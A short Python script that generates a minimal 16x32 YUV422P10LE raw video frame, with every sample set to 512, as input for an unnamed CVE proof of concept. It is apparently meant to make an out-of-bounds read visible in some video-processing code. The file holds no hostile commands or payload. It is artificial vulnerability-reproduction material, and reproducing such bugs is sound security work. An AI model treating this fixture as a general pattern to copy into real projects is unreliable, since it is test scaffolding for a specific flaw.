#!/usr/bin/env python3
"""
Generate a minimal YUV422P10LE raw video frame for CVE PoC.
Width=16, Height=32, one frame.

YUV422P10LE layout:
  Y plane:  width * height * 2 bytes = 16*32*2 = 1024 bytes
  U plane:  (width/2) * height * 2 bytes = 8*32*2 = 512 bytes
  V plane:  (width/2) * height * 2 bytes = 8*32*2 = 512 bytes
  Total: 2048 bytes
"""
import struct
import os

width = 16
height = 32

y_size = width * height        # number of 10-bit samples
u_size = (width // 2) * height
v_size = (width // 2) * height

# Use a non-trivial value (e.g. 512 = 0x0200) to make any OOB read visible
y_val = 512
u_val = 512
v_val = 512

output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_input.yuv")

with open(output_path, "wb") as f:
    # Y plane
    for _ in range(y_size):
        f.write(struct.pack("<H", y_val))
    # U plane
    for _ in range(u_size):
        f.write(struct.pack("<H", u_val))
    # V plane
    for _ in range(v_size):
        f.write(struct.pack("<H", v_val))

print(f"Written {os.path.getsize(output_path)} bytes to {output_path}")
